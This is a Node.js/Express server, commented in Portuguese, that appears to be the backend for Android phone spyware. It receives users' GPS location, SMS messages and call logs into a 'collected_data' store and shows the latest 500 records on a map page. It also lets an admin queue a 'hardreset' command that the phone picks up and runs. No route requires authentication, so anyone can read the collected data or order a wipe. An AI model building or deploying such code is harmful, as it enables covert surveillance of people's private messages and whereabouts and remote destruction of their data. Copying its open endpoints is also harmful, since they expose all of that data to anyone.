require('dotenv').config();
const express  = require('express');
const mongoose = require('mongoose');
const cors     = require('cors');
const path     = require('path');

const app = express();

// Middlewares
app.use(cors());
app.use(express.json());
app.use('/public', express.static(path.join(__dirname, 'public')));

// Connect to MongoDB Atlas
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('✅ MongoDB Atlas conectado'))
  .catch(err => {
    console.error('❌ Erro MongoDB:', err.message);
    process.exit(1);
  });

// --- Schemas & Models ---

const dataSchema = new mongoose.Schema({
  username:  { type: String, required: true },
  timestamp: { type: Date,   default: Date.now },
  location: {
    lat:  Number,
    lng:  Number,
    time: Date
  },
  sms:   Array,   // [{ from, body, date }, …]
  calls: Array    // [{ number, duration, date, type }, …]
}, { collection: 'collected_data' });

const cmdSchema = new mongoose.Schema({
  username: { type: String, required: true },
  command:  { type: String, required: true },
  issuedAt: { type: Date,   default: Date.now },
  executed: { type: Boolean, default: false }
}, { collection: 'commands' });

const Data = mongoose.model('Data', dataSchema);
const Cmd  = mongoose.model('Cmd',  cmdSchema);

// --- Routes ---

// 1) Receber dados do App Android
app.post('/api/data', async (req, res) => {
  try {
    await new Data(req.body).save();
    res.status(201).json({ status: 'ok' });
  } catch (e) {
    console.error('POST /api/data:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// 2) Listar os pontos para o mapa (últimos 500)
app.get('/api/data', async (req, res) => {
  try {
    const points = await Data
      .find()
      .sort({ timestamp: -1 })
      .limit(500)
      .lean();
    res.json(points);
  } catch (e) {
    console.error('GET /api/data:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// 3) Admin envia comando hardreset para um usuário
app.post('/api/command/:user', async (req, res) => {
  try {
    const cmd = new Cmd({
      username: req.params.user,
      command:  'hardreset'
    });
    await cmd.save();
    res.json({ status: 'command sent' });
  } catch (e) {
    console.error('POST /api/command/:user:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// 4) App Android consulta comandos pendentes
app.get('/api/command/:user', async (req, res) => {
  try {
    const cmd = await Cmd.findOne({ username: req.params.user, executed: false });
    if (!cmd) return res.json({ command: null });
    cmd.executed = true;
    await cmd.save();
    res.json({ command: cmd.command });
  } catch (e) {
    console.error('GET /api/command/:user:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// 5) Frontends estáticos
app.get('/',    (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin',(_, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor rodando em http://localhost:${PORT}`));
